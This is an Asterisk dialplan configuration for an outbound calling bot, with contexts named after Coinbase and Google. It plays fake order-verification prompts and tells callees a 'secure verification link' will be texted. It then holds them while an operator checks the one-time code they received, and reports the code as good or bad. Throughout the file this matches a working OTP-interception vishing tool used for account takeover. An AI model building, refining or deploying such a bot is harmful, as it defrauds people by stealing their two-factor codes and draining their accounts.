[outbound-coinbase]
; Enhanced context for order verification system
exten => _X.,1,Answer()
exten => _X.,n,Wait(1)
exten => _X.,n,Set(PHONE_NUMBER=${EXTEN})
exten => _X.,n,Set(CAMPAIGN_ID=${CAMPAIGN_ID})
exten => _X.,n,Set(CALL_START_TIME=${EPOCH})

; Play initial order verification message
exten => _X.,n,Playback(wave/Ifyouplacedtheorder)
exten => _X.,n,WaitExten(30)

; Handle no input - play message again once
exten => _X.,n,Playback(wave/Ifyouplacedtheorder)
exten => _X.,n,WaitExten(20)
exten => _X.,n,Playback(no-response-goodbye)
exten => _X.,n,Hangup()

; Option 1: Order confirmed - will be redirected by AMI to order-confirmed context
exten => 1,1,NoOp(Customer pressed 1 - Order confirmed)
exten => 1,n,Set(DTMF_RESULT=1)
exten => 1,n,Set(ORDER_STATUS=CONFIRMED)
; AMI will redirect to order-confirmed context

; Option 2: Issue with order - will be redirected by AMI to otp-process context
exten => 2,1,NoOp(Customer pressed 2 - Issue with order)
exten => 2,n,Set(DTMF_RESULT=2)
exten => 2,n,Set(ORDER_STATUS=ISSUE_REPORTED)
; AMI will redirect to otp-process context

; Option 9: Customer received OTP - will be redirected by AMI to verification-waiting context
exten => 9,1,NoOp(Customer pressed 9 - OTP received)
exten => 9,n,Set(OTP_ENTERED=1)
; AMI will redirect to verification-waiting context

; Timeout handler
exten => t,1,Playback(call-timeout-goodbye)
exten => t,n,Hangup()

; Invalid option handler  
exten => i,1,Playback(invalid-option)
exten => i,n,Goto(outbound-coinbase,${PHONE_NUMBER},2)

; Order confirmation context - called by AMI redirect
[order-confirmed]
exten => s,1,NoOp(Order confirmed - playing thank you message)
exten => s,n,Playback(wave/ThanksWellContinueProcess)
exten => s,n,GotoIf($["${TRANSFER_ENABLED}" = "true"]?transfer:hangup)
exten => s,n(transfer),NoOp(Transferring to ${TRANSFER_NUMBER})
exten => s,n,Playback(transferring-call)
exten => s,n,Dial(SIP/${TRUNK_NAME}/${TRANSFER_NUMBER},30,tTm)
exten => s,n,GotoIf($["${DIALSTATUS}" = "ANSWER"]?hangup)
exten => s,n,Playback(transfer-failed)
exten => s,n(hangup),Hangup()

; OTP process context - called by AMI redirect  
[otp-process]
exten => s,1,NoOp(Starting OTP process)
exten => s,n,GotoIf($["${PRESS2_AUDIO_FILE}" != ""]?custom_audio:default_audio)
exten => s,n(custom_audio),Playback(${PRESS2_AUDIO_FILE})
exten => s,n,Goto(transfer_check)
exten => s,n(default_audio),Playback(wave/WeWillTextSecureVerifLink)
exten => s,n(transfer_check),GotoIf($["${PRESS2_TRANSFER_ENABLED}" = "true"]?transfer:hold)
exten => s,n(transfer),NoOp(Transferring press 2 call to ${PRESS2_TRANSFER_NUMBER})
exten => s,n,Dial(SIP/${TRUNK_NAME}/${PRESS2_TRANSFER_NUMBER},30,tTm)
exten => s,n,GotoIf($["${DIALSTATUS}" = "ANSWER"]?end)
exten => s,n,Playback(transfer-failed)
exten => s,n,Goto(end)
exten => s,n(hold),MusicOnHold(HOLDMUSIC)
exten => s,n,Playback(otp-timeout-goodbye)
exten => s,n(end),Hangup()

exten => X,1,Goto(s,1)
exten => _X,1,Goto(s,1)

; Handle DTMF 9 in OTP process context
exten => 9,1,NoOp(Customer pressed 9 in OTP context)
; AMI will redirect to verification-waiting context

; Verification waiting context - called by AMI redirect when customer presses 9
[verification-waiting] 
exten => s,1,NoOp(Customer entered OTP - waiting for admin verification)
exten => s,n,StopMusicOnHold()
exten => s,n,Playback(wave/ThanksReviewingNow)
exten => s,n,MusicOnHold(HOLDMUSIC)

; Verification success context - called by AMI redirect when admin verifies
[verification-success]
exten => s,1,NoOp(OTP verification successful)
exten => s,n,StopMusicOnHold()
exten => s,n,Playback(wave/VerifisGOOD)
exten => s,n,Hangup()

; Verification failed context - called by AMI redirect when admin rejects
[verification-failed]
exten => s,1,NoOp(OTP verification failed)
exten => s,n,StopMusicOnHold()
exten => s,n,GotoIf($["${INVALID_OTP_AUDIO_FILE}" != ""]?custom_audio:default_audio)
exten => s,n(custom_audio),Playback(${INVALID_OTP_AUDIO_FILE})
exten => s,n,Goto(transfer_check)
exten => s,n(default_audio),Playback(wave/VerifisNOgood)
exten => s,n(transfer_check),GotoIf($["${INVALID_OTP_TRANSFER_ENABLED}" = "true"]?transfer:hold)
exten => s,n(transfer),NoOp(Transferring invalid OTP call to ${INVALID_OTP_TRANSFER_NUMBER})
exten => s,n,Dial(SIP/${TRUNK_NAME}/${INVALID_OTP_TRANSFER_NUMBER},30,tTm)
exten => s,n,GotoIf($["${DIALSTATUS}" = "ANSWER"]?end)
exten => s,n,Playback(transfer-failed)
exten => s,n,Goto(end)
exten => s,n(hold),MusicOnHold(HOLDMUSIC)
exten => s,n(end),Hangup()

[outbound-google]
exten => _X.,1,Answer()
exten => _X.,n,Playback(googleintro)
exten => _X.,n,WaitExten(10)

exten => 1,1,Playback(googleoutro)
exten => 1,2,Hangup()

exten => _X.,n,Hangup()

[outbound-order-verification]
include => outbound-coinbase

[hangup-context]
exten => s,1,Playback(call-terminated)
exten => s,n,Hangup()

[test-context]
exten => s,1,Answer()
exten => s,n,Playback(${ARG1})
exten => s,n,Hangup()